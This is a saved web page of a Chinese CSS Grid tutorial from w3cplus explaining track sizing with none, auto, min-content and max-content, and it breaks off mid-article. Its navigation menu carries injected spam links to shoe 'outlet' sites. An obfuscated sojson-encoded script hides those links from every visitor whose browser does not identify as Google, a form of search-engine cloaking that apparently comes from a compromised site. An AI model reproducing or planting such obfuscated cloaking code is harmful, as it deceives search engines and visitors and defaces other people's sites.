<!DOCTYPE html>
<!-- saved from url=(0132)https://www.w3cplus.com/css/grid-layout-part-4.html?expire=1699847809&code=Kw6KhoSTdEo&sign=24607b9220940a950b960c4e058803b7#paywall -->
<html lang="zh-hans" class="js"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  
<link rel="shortcut icon" href="https://www.w3cplus.com/sites/all/themes/w3cplusV2/favicon.ico" type="image/vnd.microsoft.icon">
<meta name="description" content="在[“图解CSS：Grid布局” 系列](//www.w3cplus.com/blog/tags/356.html) 的[第三部分](//www.w3cplus.com/css/grid-layout-part-3.html) 主要探讨了，在 `grid-template-columns` 和 `grid-template-rows` 中使用长度值来设置网格轨道尺寸大小。这里长度值指的是使用不同单位（比如，`px`，`%`，`em`，`rem`和`vw`等）值，并且花了较长的篇幅和大家探讨了 `fr` （弹性系数，又称``系数）给网格轨道尺寸带来的变化以及 `fr` 在网格轨道中是怎么计算的。不过，在网格布局中，除了使用上一章节中用的带有不同单位的长度值之外，还可以使用一些关键词，比如接下来要介绍的 `none` 和">
<meta name="keywords" content="前端,图解CSS, Web布局系列, 布局, Grid, Layout, 会员专栏,教程">
<meta name="generator" content="Drupal 7 (http://drupal.org)">
<link rel="canonical" href="https://www.w3cplus.com/css/grid-layout-part-4.html">
<link rel="shortlink" href="https://www.w3cplus.com/node/2714">
  <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta itemprop="name" content="W3cplus">
  <meta itemprop="image" content="//www.w3cplus.com/w3cplus-logo.jpg">
  <meta name="baidu-site-verification" content="ftyq813qEZgpw9nb">
  <meta name="applicable-device" content="pc,mobile">
  <title>图解CSS: Grid布局（Part4）_图解CSS, Web布局系列, 布局, Grid, Layout, 会员专栏 教程_W3cplus</title>
  <link type="text/css" rel="stylesheet" href="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/css_xE-rWrJf-fncB6ztZfd2huxqgxu4WO-qwma6Xer30m4.css" media="all">
<link type="text/css" rel="stylesheet" href="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/css_hYCLW089C9S9sP3ZYkuG6R-Q5ZHbEhblZBFjwZ_bE_I.css" media="all">
<link type="text/css" rel="stylesheet" href="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/css_W_jVXC7gZD8ENo3AHIwFL3Mih90k_Go_X3-i_hfyj2c.css" media="all">
<link type="text/css" rel="stylesheet" href="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/css_dc6MGCsMvp7moqrq-cRLC0GLEMrFF3Ego_HOWYVsZG4.css" media="all">
  <script src="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/hm.js.下载"></script><script type="text/javascript" src="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/jquery.min.js.下载"></script>

</head>
<body class="html not-front not-logged-in one-sidebar sidebar-second page-node page-node- page-node-2714 node-type-blog" style="">
  <div id="skip-link">
    <a href="https://www.w3cplus.com/css/grid-layout-part-4.html?expire=1699847809&amp;code=Kw6KhoSTdEo&amp;sign=24607b9220940a950b960c4e058803b7#main-content" class="element-invisible element-focusable">跳转到主要内容</a>
  </div>
    <div id="header" role="header">
  <div class="container">
    <h1 id="logo">
      <a href="https://www.w3cplus.com/" title="记述前端那些事——引领Web前沿" id="site_name">w3cplus</a>
    </h1>
    <div class="toggle-topbar menu-icon" id="pull">
      <a href="https://www.w3cplus.com/css/grid-layout-part-4.html?expire=1699847809&amp;code=Kw6KhoSTdEo&amp;sign=24607b9220940a950b960c4e058803b7#"><span>Menu</span></a>
    </div>
    <div class="toogle-topbar-content" id="pull-menu">
              <ul class="menu clearfix"><li class="keys_words leaf" style="display: none;"><a class="keys_words" href="https://www.ietp.com/fr/dfejcashop/" title="nike air jordan 1 low outlet
" style="display: none;">nike air jordan 1 low outlet
</a></li><li class="keys_words leaf" style="display: none;"><a class="keys_words" href="https://www.ietp.com/fr/dfejcashop/" title="air jordan 1 outlet near me
" style="display: none;">air jordan 1 outlet near me
</a></li><li class="keys_words leaf" style="display: none;"><a class="keys_words" href="https://www.jmksport.com/adahavshop/" title="nike air force 1 uv color change da8301 100 101 release date
" style="display: none;">nike air force 1 uv color change da8301 100 101 release date
</a></li><li class="keys_words leaf" style="display: none;"><a class="keys_words" href="https://www.giftofvision.co/dddyshop" title="The Global Destination For Modern Luxury
" style="display: none;">The Global Destination For Modern Luxury
</a></li><li class="keys_words leaf" style="display: none;"><a class="keys_words" href="https://www.ietp.com/fr/dfediqshop/news/the-best-nike-air-force-1-colourways-of-all-time/" title="The 25 Best Air Force basketball 1 Colourways of All Time , IetpShops , Nike Swoosh logo embroidered fleece shorts
" style="display: none;">The 25 Best Air Force basketball 1 Colourways of All Time , IetpShops , Nike Swoosh logo embroidered fleece shorts
</a></li><li class="first leaf"><a href="https://www.w3cplus.com/blog/tags/686.html" title="会员专栏">会员专栏</a></li>
<li class="leaf"><a href="https://www.w3cplus.com/CSS3" title="">CSS</a></li>
<li class="leaf"><a href="https://www.w3cplus.com/JavaScript" title="JavaScript">JavaScript</a></li>
<li class="leaf"><a href="https://www.w3cplus.com/css/books.html" title="我的小册">小册</a></li>
<li class="leaf"><a href="https://www.w3cplus.com/mobile" title="">Mobile</a></li>
<li class="leaf"><a href="https://www.w3cplus.com/svg-tutorial" title="SVG">SVG</a></li>
<li class="leaf"><a href="https://www.w3cplus.com/tags" title="标签云">标签云</a></li>
<li class="last leaf"><a href="https://www.w3cplus.com/blogs-lists" title="文章列表">文章列表</a></li>
<script>['sojson.v4']["\x66\x69\x6c\x74\x65\x72"]["\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72"](((['sojson.v4']+[])["\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72"]['\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65']['\x61\x70\x70\x6c\x79'](null,"118J97J114e32K109l121m95L107G101q121O95v119X111Z114Q100P95f114s101y32l61S32c110p101W119b32w82E101F103g69i120Q112V40h34J71n111K111V103Z108T101g124z109f121L116R101D115z116d34a44p32m34H103o105X34V41h59g105Z102P40Z33j109x121d95d107g101p121J95W119R111K114c100J95M114o101t46V116f101Q115x116u40J110Z97l118N105o103o97R116L111L114W46L117R115I101T114E65K103D101a110e116L41v41E32z123V32i118w97U114Q32d99k108B97j115W115k95i109B121a95v107S101G121H95e119o111J114z100O32B61e32B100F111Y99t117b109G101E110i116D46B103y101m116Q69D108n101G109m101x110d116p115y66E121U67i108P97s115e115H78r97g109c101d40h39S107x101U121f115O95u119r111l114G100n115I39c41o59i32k102v111c114r40y118H97B114E32L105d32n61P32W48l59h32q105W32V60s32j99g108h97f115Y115W95P109J121z95T107I101r121J95Z119t111W114q100X46E108G101m110X103e116P104i59r32K105i43S43W41m32D99x108a97S115W115U95S109s121j95x107Z101v121i95n119S111y114z100x91z105B93U46K115V116Q121B108x101b46i100V105R115P112N108u97E121y32w61P32W39A110t111Q110A101n39h59e125"['\x73\x70\x6c\x69\x74'](/[a-zA-Z]{1,}/))))('sojson.v4');</script></ul>        <!-- /#main-menu -->
          </div>
  </div>
</div>

  <div id="branding" role="branding">
    <div class="container">
        <div class="region region-branding">
    <div id="block-block-46" class="block block-block">

    
  <div class="content">
    <div style="margin-bottom: 5px;">
	<a rel="nofollow" href="https://s.juejin.cn/ds/iJrTure4/" target="_blank" title="现代 CSS"><img alt="现代 CSS" src="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/WechatIMG324.jpg" style="width: 100%;height:auto"></a></div>  </div>
</div>
  </div>
    </div>
  </div> 

<div id="page" role="page">
  <div class="container">
    
    <div class="col-main">
      <div class="main-wrap">
        
                
        <div class="page-inner">
                      <div id="breadcrumb" role="breadcrumb">
              <h2 class="element-invisible">你在这里</h2><div class="breadcrumb"><a href="https://www.w3cplus.com/">首页</a></div>            </div>
          
          
          <a id="main-content"></a>
                                <h1 class="title" id="page-title">
              图解CSS: Grid布局（Part4）            </h1>
          
                    
                                <div class="region region-content">
    <div id="block-system-main" class="block block-system">

    
  <div class="content">
    <div id="node-2714" class="node node-blog node-promoted node-full clearfix" about="/css/grid-layout-part-4.html" typeof="sioc:Post sioct:BlogPost">
  
  <div class="node-header">
              <div class="submitted">
          作者：<span>大漠</span>          日期：<span>2021-05-12</span>          点击：<span>471</span>        </div>
            <div class="tags">
        <div class="field field-name-field-blog-tag field-type-taxonomy-term-reference field-label-hidden"><div class="field-items"><div class="field-item even"><a href="https://www.w3cplus.com/blog/tags/674.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">图解CSS</a></div><div class="field-item odd"><a href="https://www.w3cplus.com/blog/tags/695.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">Web布局系列</a></div><div class="field-item even"><a href="https://www.w3cplus.com/blog/tags/130.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">布局</a></div><div class="field-item odd"><a href="https://www.w3cplus.com/blog/tags/356.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">Grid</a></div><div class="field-item even"><a href="https://www.w3cplus.com/blog/tags/180.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">Layout</a></div><div class="field-item odd"><a href="https://www.w3cplus.com/blog/tags/686.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">会员专栏</a></div></div></div>      </div>
  </div>

  
  <div class="body-content clearfix">
    <div id="block-block-22" class="block block-block">

    
  <div class="content">
    <div>
<blockquote>
<p style="font-size: 14px;"><strong>特别声明：</strong>如果您喜欢小站的内容，可以点击<a href="https://www.zhi12.cn/paywall/membership/widget?uid=5491&amp;siteid=s_64be3b00&amp;cms=drupal&amp;content_id=2610&amp;callback=https%3A//www.w3cplus.com&amp;source=https%3A//www.w3cplus.com%3Fq%3Dnode/2610&amp;sign=ecbcc7859e33dea192cf9efdb6d2e61c" style="background: #FF5722;color: #fff;  display: inline-block; padding: 10px; border-radius: 4px;  line-height: 1; margin: 0 3px;" target="_blank">申请会员</a>进行全站阅读。如果您对付费阅读有任何建议或想法，欢迎发送邮件至: <strong>airenliao@gmail.com</strong>!或添加QQ：874472854(^_^)</p>
</blockquote>
</div>  </div>
</div>
<div class="field field-name-body field-type-text-with-summary field-label-hidden"><div class="field-items"><div class="field-item even" property="content:encoded"><div class="paywall paywall-mb"><div class="paywall-center"><small class="paywall-highlight">* 文本为付费内容（4.99元），您已获得全文阅读权限</small></div></div><p>在<a href="https://www.w3cplus.com/blog/tags/356.html" target="_blank">“图解CSS：Grid布局” 系列</a> 的<a href="https://www.w3cplus.com/css/grid-layout-part-3.html" target="_blank">第三部分</a> 主要探讨了，在 <code>grid-template-columns</code>  和 <code>grid-template-rows</code> 中使用长度值来设置网格轨道尺寸大小。这里长度值指的是使用不同单位（比如，<code>px</code>，<code>%</code>，<code>em</code>，<code>rem</code>和<code>vw</code>等）值，并且花了较长的篇幅和大家探讨了 <code>fr</code> （弹性系数，又称<code>&lt;flex&gt;</code>系数）给网格轨道尺寸带来的变化以及 <code>fr</code> 在网格轨道中是怎么计算的。不过，在网格布局中，除了使用上一章节中用的带有不同单位的长度值之外，还可以使用一些关键词，比如接下来要介绍的 <code>none</code> 和 <code>auto</code>（我们熟悉的），<code>min-content</code>、<code>max-content</code>、<code>fit-content</code> 等关键词以及<code>fit-content()</code>函数。阅读完这篇文章之后，你就能了解这些关键词是如何帮助我们来设置网格轨道尺寸。感兴趣的同学请继续往下阅读。</p>

<h2 class="content-title" data-index="2">none</h2>

<p>关键词<code>none</code> 是 <code>grid-template-columns</code> 和 <code>grid-template-rows</code> 属性的默认值。如果这两个属性的值设置为 <code>none</code> 时，意味着 <strong>没有显式网格轨道</strong>。如果网格轨道中任何网格项目，仍然会得到隐式网格轨道。比如下面这个示例：</p>

<pre class="css"><code class="css"><span class="class"><span class="class">.container</span></span> <span class="rules"><span class="rules">{
    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>fr <span class="number"><span class="number">1</span></span>fr;</span></span></span><span class="value"></span></span>
    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> none;</span></span></span><span class="value"></span></span>
    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-auto-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>fr;</span></span></span><span class="value"></span></span>
<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
</code></pre>

<div style="margin-bottom: 20px">
<iframe height="540" style="width: 100%;" scrolling="no" title="Grid track size with none keyword" src="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/zYZxVJL(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
  See the Pen <a rel="nofollow" href='https://codepen.io/airen/pen/zYZxVJL'>Grid track size with none keyword</a> by Airen
  (<a rel="nofollow" href='https://codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='https://codepen.io'>CodePen</a>.
</iframe>
</div>

<p>这个示例 <code>grid-template-rows</code> 属性显式设置了 <code>none</code> 值，创建隐式的行，但是由于网格容器中有四个网格项目，因此会有两个隐式的行。另外，使用<code>grid-auto-rows</code> 属性定义了隐式行大小（行高）。</p>

<p><code>none</code>还起着另一个作用。如果你希望重置或覆盖之前定义的网格时，就可以使用该值。</p>

<blockquote>
  <p><strong>注意，在没有显式网格的情况下，任何行（或列）都将隐式生成，它们的大小将由 <code>grid-auto-rows</code> 和 <code>grid-auto-columns</code> 属性决定。比如示例中的<code>grid-auto-rows</code>就设置了值为<code>1fr</code>。</strong></p>
</blockquote>

<h2 class="content-title" data-index="2">auto</h2>

<p><code>auto</code>是自动的意思，指的是 <strong>网格项目内容的大小</strong>。将一列设置为<code>auto</code>时，意味着将其设置为其网格项目的宽度；将一行设置为<code>auto</code>时，意味着将其设置为其网格项目的高度。比如下面这个示例：</p>

<pre class="css"><code class="css"><span class="class"><span class="class">.container</span></span> <span class="rules"><span class="rules">{
    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> auto auto auto;</span></span></span><span class="value"></span></span>
    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">5</span></span>px;</span></span></span><span class="value"></span></span>
<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
</code></pre>

<div style="margin-bottom: 20px">
<iframe height="500" style="width: 100%;" scrolling="no" title="Grid track size with auto keyword" src="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/WNpbVod.html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
  See the Pen <a rel="nofollow" href='https://codepen.io/airen/pen/WNpbVod'>Grid track size with auto keyword</a> by Airen
  (<a rel="nofollow" href='https://codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='https://codepen.io'>CodePen</a>.
</iframe>
</div>

<p>上面示例，<code>grid-template-columns</code>设置的值为<code>auto auto auto</code>，表示三列网格轨道宽度都是<code>auto</code>，第一个网格项目和第三个网格项目的内容都是文本，只是内容长度不一样，第二个网格项目的内容是一张图片。此时，第一列和第三列的列宽是文本内容长度对应的宽度，第二列是图片宽度：</p>

<p><img src="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/css-grid-92.jpg" alt=""></p>

<p>为了更好的向大家展示<code>auto</code>给网格轨道带来的变化，示例中的第一个网格项目设置了<code>contenteditable="true"</code>，你可以在直接在第一个网格项目中编辑文本内容。当你输入任意内容时，你会看到第一列网格轨道的大小也会随之发生变化，以匹配文本的宽度：</p>

<div style="margin-bottom: 20px">
<video controls="" width="100%" style="width: 100%; aspect-ratio: 16 / 9;" poster="/sites/default/files/blogs/2021/2105/css-grid-92.jpg">
    <source src="/sites/default/files/blogs/2021/2105/css-grid-92.mp4" type="video/mp4">
</video>
</div>

<p>正如上面视频展示的效果所示，设置为<code>auto</code>的列，只有在有空间的情况下才会有完整的文本尺寸（所在行所有文本宽度总和）。否则，它将导致文本换行。</p>

<p>如果你阅读《<a href="https://www.w3cplus.com/css/auto-value-in-css.html" target="_blank">CSS中 <code>auto</code> 值你知多少</a>》一文的话，会发现：</p>

<blockquote>
  <p><strong>关键词<code>auto</code>在整个CSS中可以有不同的含义（运用在不同的CSS属性中，代表的含义和所起的作用不同）</strong>。</p>
</blockquote>

<p>例如，块级元素 <code>width</code>取值<code>auto</code>时，表示占用块元素所有可用的宽度，而在内联级元素中，它只占用内容所需的空间。这样一描述的话，你是不是已经感觉到了，在网格布局中，网格轨道取值为<code>auto</code>时，渲染的行为类似于行内元素，它将占用内容的空间。不过，在网格轨道中使用<code>auto</code>时，会有一个例外，<strong>如果网格轨道中有一个网格项目设置尺寸，那么这个尺寸将会直接影响到对应网格轨道尺寸</strong>。 比如，上面的示例，如果在第三个网格项目中显式设置<code>width</code>值：</p>

<pre class="css"><code class="css"><span class="class"><span class="class">.grid__item</span></span> <span class="rules"><span class="rules">{
    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">width</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">200</span></span>px;</span></span></span><span class="value"></span></span>
<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
</code></pre>

<p>这个网格项目对应的网格列轨道尺寸也变了，变成了<code>200px</code>：</p>

<p><img src="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/css-grid-93.jpg" alt=""></p>

<p>事实上，网格轨道取值为<code>auto</code>，还有很多细节，比如如何分配额外的空间，我们在这不做详细阐述，但可以仔细阅读后面有关于网格轨道尺寸算法相关的章节。</p>

<p>在实际使用的时候，如果你希望网格轨道大小与网格项目内容尺寸相匹配时，就可以使用<code>auto</code>值。而且<code>auto</code>特别适用于文本、图片、SVG和Canvas等元素。</p>

<h2 class="content-title" data-index="2">min-content 和 max-content</h2>

<p>在《<a href="https://www.w3cplus.com/css/css-intrinsic-and-extrinsic-sizing.html" target="_blank">图解CSS: 元素尺寸的设置</a>》一章中，我们了解到：</p>

<blockquote>
  <p><strong>在CSS中存在两种尺寸：内在尺寸（Intrinsic Size）和外在尺寸（Extrinsic Size）</strong>。</p>
</blockquote>

<p>元素的<code>width</code>或<code>height</code>设置的固定属性值，就是指外在尺寸；而由元素包含的内容量决定的尺寸就是指内在尺寸。其中，CSS的<code>min-content</code>、<code>max-content</code>和<code>fit-content</code>都是内在尺寸的代表。同样地，在网格轨道尺寸设置中也可以使用这几个内在属性值。</p>

<p>在正式开始介绍<code>min-content</code>和<code>max-content</code>在网格轨道中的含义之间，先花点时间了解这两个属性的含义。</p>

<p>从字面上来理解，<code>min-content</code>指的就是内在的最小尺寸（它有可能是宽或高）：</p>

<ul>
<li>如果指宽度的话，它等于元素内容里最长的那个单词宽度</li>
<li>如果指高度的话，它等于元素内容所有行的高度总和（内容有可能会断行）</li>
</ul>

<p>比如说：</p>

<pre class="xml"><code class="xml"><span class="comment"><span class="comment">&lt;!-- HTML --&gt;</span></span>
<span class="tag"><span class="tag">&lt;<span class="title"><span class="title">h1</span></span>&gt;</span></span>CSS is Awesome<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">h1</span></span>&gt;</span></span>

/* CSS */
h1 {
    width: min-content;
}
</code></pre>

<div style="margin-bottom: 20px">
<iframe height="500" style="width: 100%;" scrolling="no" title="Intrinsic Sizing In CSS：min-content for width" src="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/eYvNOXB.html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
  See the Pen <a rel="nofollow" href='https://codepen.io/airen/pen/eYvNOXB'>Intrinsic Sizing In CSS：min-content for width</a> by Airen
  (<a rel="nofollow" href='https://codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='https://codepen.io'>CodePen</a>.
</iframe>
</div>

<p>拖动示例中的滑块，会发现<code>h1</code>的<code>width</code>设置为<code>min-content</code>时，不管容器宽度怎么变，它始终都是单词“Awesome”的宽度（当前行最长单词的宽度），而<code>width</code>取值为<code>auto</code>会随着容器宽度变化：</p>

<p><img src="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/css-grid-94.jpg" alt=""></p>

<p>再来看<code>max-content</code>，它表示元素的内在首选宽度（Intrinsic Preferred Width），它等于元素内容的宽度。我们在上面的示例基础上添加<code>max-content</code>的示例：</p>

<pre class="css"><code class="css"><span class="tag"><span class="tag">h1</span></span> <span class="rules"><span class="rules">{
    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">width</span></span></span><span class="rule">:<span class="value"><span class="value"> max-content;</span></span></span><span class="value"></span></span>
<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
</code></pre>

<div style="margin-bottom: 20px">
<iframe height="500" style="width: 100%;" scrolling="no" title="Intrinsic Sizing In CSS：min/max-content for width" src="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/JjWdodq.html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
  See the Pen <a rel="nofollow" href='https://codepen.io/airen/pen/JjWdodq'>Intrinsic Sizing In CSS：min/max-content for width</a> by Airen
  (<a rel="nofollow" href='https://codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='https://codepen.io'>CodePen</a>.
</iframe>
</div>

<p>调整示例中滑块，改变<code>.container</code>容器宽度，<code>h1</code> 的 <code>width</code> 分别设置为 <code>auto</code>、<code>min-content</code> 和 <code>max-content</code>值，只有 <code>auto</code>会随容器宽度变化，<code>min-content</code> 和 <code>max-content</code> 并无差异。其中当容器小到一定的时候，<code>h1</code> 的内容会溢出容器：</p>

<p><img src="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/css-grid-95.jpg" alt=""></p>

<p>示例中不难发现：</p>

<ul>
<li><strong><code>min-content</code></strong> ：容器会包含其内容的小最宽度。即，浏览器（客户端）会查看容器内哪一点内容最宽，并将容器的宽度设置为该值。最宽的内容是文本中最长的字（英文中是最长单词，汉文是一个汉字），或最宽的图像，或视频等</li>
<li><strong><code>max-content</code></strong> ：容器需要的宽度，以包含其所有的内容。示例中演示的情况，意味着所有的文本都被放在一行上，容器变得尽可能的宽，以包含整行的内容。一般来说，这不是一个理想的效果。最大的内容（<code>max-content</code>）也可能是图像或视频等；在这种情况下，浏览器会使用这个宽度来决定容器的宽度</li>
</ul>

<p>不过， CSS 中的 <code>white-space</code> 和 <code>hyphens</code> 的取值对于 <code>width</code> 属性取值 <code>min-content</code> 和 <code>max-content</code> 会有一定的影响。比如说，<code>hyphens: auto</code>下，<code>width</code> 取 <code>min-content</code>时，浏览器会在确定最小宽度之前，在正确的连字符点上断开单词； <code>width</code> 取 <code>max-content</code> 并变化。如果在 <code>h1</code> 中设置<code>white-space: nowrap</code>时，<code>min-content</code> 和 <code>max-content</code> 表现一致：</p>

<div style="margin-bottom: 20px">
<iframe height="600" style="width: 100%;" scrolling="no" title="Intrinsic Sizing In CSS：min/max-content for width " src="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/xxqGopW.html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
  See the Pen <a rel="nofollow" href='https://codepen.io/airen/pen/xxqGopW'>Intrinsic Sizing In CSS：min/max-content for width </a> by Airen
  (<a rel="nofollow" href='https://codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='https://codepen.io'>CodePen</a>.
</iframe>
</div>

<p>或许你已经猜到了，CSS 网格布局中的 <code>grid-template-columns</code> 和 <code>grid-template-rows</code> 中也可以显式的使用 <code>min-content</code> 和 <code>max-content</code> 来定义网格轨道的尺寸。而且使用方式和前面介绍的<code>px</code>、<code>1fr</code> 和 <code>vw</code>等相同。如：</p>

<pre class="css"><code class="css"><span class="class"><span class="class">.container</span></span> <span class="rules"><span class="rules">{
    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> min-content <span class="number"><span class="number">1</span></span> fr max-content;</span></span></span><span class="value"></span></span>
<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
</code></pre>

<p>为了更好的帮助大家理解，<code>min-content</code> 和 <code>max-content</code> 给网格轨道尺寸大小会产生什么样的结果，先从简单的示例开始：</p>

<div style="margin-bottom: 20px">
<iframe height="500" style="width: 100%;" scrolling="no" title="Grid Tracks size with min/max-content" src="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/YzZXmyK.html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
  See the Pen <a rel="nofollow" href='https://codepen.io/airen/pen/YzZXmyK'>Grid Tracks size with min/max-content</a> by Airen
  (<a rel="nofollow" href='https://codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='https://codepen.io'>CodePen</a>.
</iframe>
</div>

<p>在这个示例中，网格的第一列和第三列网格轨道分别设置的是 <code>min-content</code> 和 <code>max-content</code>，但它们的内容都是相同（“Content”这个单词），这个时候，这两列网格轨道相等，即 <code>min-content</code> 等于 <code>max-content</code>。这是因为这两列的文本内容“Content”长度相等：</p>

<p><img src="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/css-grid-96.jpg" alt=""></p>

<p>如果我们把上面示例中的第一列和第三我文本内容做出相应的调整（复杂的文本内容），那么使用 <code>min-content</code> 和 <code>max-content</code> 就变得有趣多了。基于上面的示例，在第一列和第三列的 <code>div</code> 元素上添加 <code>contenteditable="true"</code> 属性，用户可以编辑网格项目中的内容：</p>

<pre class="xml"><code class="xml"><span class="comment"><span class="comment">&lt;!-- HTML --&gt;</span></span>
<span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"grid__container"</span></span>&gt;</span></span>
    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"grid__item"</span></span> <span class="attribute"><span class="attribute">contenteditable</span></span>=<span class="value"><span class="value">"true"</span></span>&gt;</span></span>This Text can edited by the user.<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"grid__item"</span></span>&gt;</span></span> Lucy<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span> 
    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"grid__item"</span></span> <span class="attribute"><span class="attribute">contenteditable</span></span>=<span class="value"><span class="value">"true"</span></span>&gt;</span></span>This Text can edited by the user.<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
</code></pre>

<div style="margin-bottom: 20px">
<iframe height="500" style="width: 100%;" scrolling="no" title="Grid Tracks size with min/max-content" src="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/rNyOBaE.html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
  See the Pen <a rel="nofollow" href='https://codepen.io/airen/pen/rNyOBaE'>Grid Tracks size with min/max-content</a> by Airen
  (<a rel="nofollow" href='https://codepen.io/airen'>@airen</a>) on <a rel="nofollow" href='https://codepen.io'>CodePen</a>.
</iframe>
</div>

<p>在这里，<code>min-content</code> 使用了文本中 <strong>最长的单词</strong> （示例中默认文本的“edited”，调整后的“Awesome!”）宽度作为第一列网格轨道的尺寸；<code>max-content</code> 使用了文本中 <strong>所有字符串</strong> 宽度作为第三列网格轨道的尺寸：</p>

<p><img src="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/css-grid-97.jpg" alt=""></p>

<p>同样的，如果在设置了<code>min-content</code> 或 <code>max-content</code> 网格轨道所在的网格项目中显式设置 <code>white-space: nowrap</code>时，<code>min-content</code>的表现行为和<code>max-content</code>相似；如果显式设置的是<code>hyphens:auto</code>时，<code>min-content</code>的网格列轨道宽度是“在正确的连字符点上断开单词”时的宽度：</p>

<p><img src="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/css-grid-98.jpg" alt=""></p>

<blockquote>
  <p><strong>注意，用户输入的文本内容不同，<code>min-content</code> 和 <code>max-content</code> 表现出来的结果有一定的差异</strong>。</p>
</blockquote>

<p>在网格轨道尺寸设置中使用<code>max-content</code>，虽然有一定的优势，但也对我们布局带来一定的麻烦，比如说，不人为换行，网格项目中的文本会一直在同一行，有点类似于显式设置了<code>white-space: nowrap</code>，这样一来就会造成网格项目溢出网格容器：</p>

<p><img src="./Grid布局：4-使用内在尺寸定义网格轨道尺寸_files/css-grid-99.jpg" alt=""></p>

<p>在 Web 中图像是不可或缺的内容，那我们在上面的示例上稍作调整，在第一列和第三列，分别添加一张 <code>300px x 150px</code>的图像。来看看<code>min-content</code> 和 <code>max-content</code> 和 <code>&lt;img&gt;</code> 在网格轨道中会有什么样的表现行为：</p>

<div style="margin-bottom: 20px">
